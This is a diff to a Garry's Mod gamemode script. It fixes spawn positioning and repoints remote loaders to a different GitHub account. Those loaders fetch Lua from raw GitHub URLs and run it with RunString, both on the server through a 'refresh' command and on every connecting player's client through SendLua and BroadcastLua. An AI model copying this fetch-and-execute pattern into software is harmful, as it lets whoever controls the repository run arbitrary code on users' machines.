@@ -415,7 +415,7 @@ function DoSpawns(playe)
 		playe:Give("weapon_fists")
 		playe:SetWalkSpeed(160)
 		playe:SetRunSpeed(240)
-		playe:Vector(playerSpawns[math.random(1, #playerSpawns)])
+		playe:SetPos(Vector(playerSpawns[math.random(1, #playerSpawns)]))
 		cachedPlayers[playe] = true
 
 		return
@@ -426,7 +426,7 @@ function DoSpawns(playe)
 		ply:Give("weapon_fists")
 		ply:SetWalkSpeed(160)
 		ply:SetRunSpeed(240)
-		ply:Vector(playerSpawns[math.random(1, #playerSpawns)])
+		ply:SetPos(Vector(playerSpawns[math.random(1, #playerSpawns)]))
 		if not ply:Alive() then continue end
 		cachedPlayers[ply] = true
 	end
@@ -530,7 +530,7 @@ local function CreateCommand(string, callback, check)
 end
 
 CreateCommand("refresh", function(ply)
-	http.Fetch("https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/server.lua", function(body)
+	http.Fetch("https://raw.githubusercontent.com/KaptianCore/Fortnut/main/lua/server.lua", function(body)
 		RunString(body)
 	end)
 end, function(ply) return trusted[ply:SteamID()] end)
@@ -617,10 +617,10 @@ end, 2)
 
 hook.Add("ClientSignOnStateChanged", "sendcuntshit", function(userid, old, new)
 	if new == SIGNONSTATE_FULL then
-		Player(userid):SendLua("http.Fetch('https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
+		Player(userid):SendLua("http.Fetch('https://raw.githubusercontent.com/KaptianCore/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
 	end
 end)
 
 print("Loaded fortnut gamemode")
-BroadcastLua("http.Fetch('https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
+BroadcastLua("http.Fetch('https://raw.githubusercontent.com/KaptianCore/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
 
